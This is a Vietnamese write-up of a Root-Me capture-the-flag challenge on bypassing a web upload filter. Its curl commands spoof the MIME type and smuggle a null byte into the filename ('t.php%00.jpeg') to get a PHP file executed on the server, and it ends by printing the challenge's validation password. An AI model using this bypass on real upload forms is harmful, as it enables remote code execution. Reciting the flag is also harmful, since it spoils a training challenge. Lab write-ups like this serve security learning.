# File upload - Null byte

## Solution

Như thường lệ, các tiện ích shell rất hữu ích để thực hiện các thử nghiệm, trước tiên cần xác định một số biến môi trường:

```
url="http://challenge.root-me.org//web-serveur/ch22/"
cookies="spip_session=1234_deadbeefdeadbeefdeadbeafdeadbeef"
```

Challenge này cần một cookie khác để hoạt động chính xác, cookie này được gửi khi lần đầu tiên thử truy cập $url:

```
curl -D - -b "$cookies" "$url"
HTTP/1.1 302 Found
Date: Fri, 28 Dec 2012 10:31:02 GMT
Server: Apache
Location: ./
Vary: Accept-Encoding
Content-Length: 0
Content-Type: text/html; charset=utf-8
X-Pad: avoid browser bug
Set-Cookie: rand22=298520383
```

Thêm nó vào biến môi trường cookie: `cookies="$cookies;rand22=298520383"`

Muốn upload PHP code, vì vậy hãy vào phần Upload:

```
curl -b "$cookies" "$url?action=upload&galerie=upload" | tidy -iq -utf8
...
...
  <form action="" method="post" enctype="multipart/form-data">
    <input type="file" name="file"><input type="submit" value=
    "upload">
  </form><br>
  <br>
  <i>NB : only GIF, JPEG or PNG are accepted</i>
...
```

Thử tải lên đoạn mã php đơn giản này (t.php):

```
<?php
echo 'powned';
?>
```

```
curl -s -b "$cookies" -F submit=upload -F "file=@t.php" "${url}?action=upload&galerie=upload"  | tidy -iq -w 0 -utf8
...
  <p style="color: red">Wrong file type !</p>
...
```

Cũng có thể chỉ định loại MIME của file tải lên:

```
curl -s -b "$cookies" -F submit=upload -F "file=@t.php;type=image/jpeg" "${url}?action=upload&galerie=upload"  | tidy -iq -w 0 -utf8
...
  <p style="color: red">Wrong extension !</p>
...
```

Cũng có thể chỉ định tên thay thế cho file tải lên:

```
curl -s -b "$cookies" -F submit=upload -F "file=@t.php;filename=t.jpeg;type=image/jpeg" "${url}?action=upload&galerie=upload"  | tidy -iq -w 0 -utf8
...
  File information&nbsp;:<br>
  <ul>
    <li>Upload: t.jpeg</li>
    <li>Type: image/jpeg</li>
    <li>Size: 0.0263671875 kB</li>
    <li>Stored in: /tmp/phpZK2ji6</li>
  </ul><b>File uploaded</b>.
...
```

Được rồi, nó hoạt động, tuy nhiên tệp này không được PHP xử lý:

```
curl -D - -b "$cookies" "${url}galerie/upload/t.jpeg"
HTTP/1.1 200 OK
Date: Fri, 28 Dec 2012 13:07:03 GMT
Server: Apache
Last-Modified: Fri, 28 Dec 2012 13:05:26 GMT
ETag: "223e3-1b-4d1e9512cdd6f"
Accept-Ranges: bytes
Content-Length: 27
Content-Type: image/jpeg
 
<?php
echo 'powned';
?>
```

Có lẽ vì phần mở rộng tệp không phải là .php, có thể thử khai thác lỗ hổng PHP (cũ): #39863 file_exists() âm thầm cắt bớt sau một byte null (đã sửa từ PHP 5.3.4):

```
curl -s -b "$cookies" -F submit=upload -F "file=@t.php;filename=t.php%00.jpeg;type=image/jpeg" "${url}?action=upload&galerie=upload"  | tidy -iq -w 0 -utf8                                                                                                                                          
...
  File information&nbsp;:<br>
  <ul>
    <li>Upload: t.php%00.jpeg</li>
    <li>Type: image/jpeg</li>
    <li>Size: 0.0263671875 kB</li>
    <li>Stored in: /tmp/phpEAqUcr</li>
  </ul><b>File uploaded</b>.
...
```

Hãy xem những gì có trong phần Upload:

```
curl -v -b "$cookies" "${url}?galerie=upload" | tidy -iq -utf8 -w
...
      <td><a href="galerie/upload/t.php"><img width="64px" height="64px" src="galerie/upload/d.php?preview" alt="d.php"></a></td>
...
```

Điều này có vẻ ổn (phần mở rộng hiện là .php). Và bước cuối cùng để có được flag:

```
curl -b "$cookies" "${url}galerie/upload/t.php"
<html>Well done ! You can validate this challenge with the password : YPNchi2NmTwygr2dgCCF<br/>This file is already deleted.</html>
```
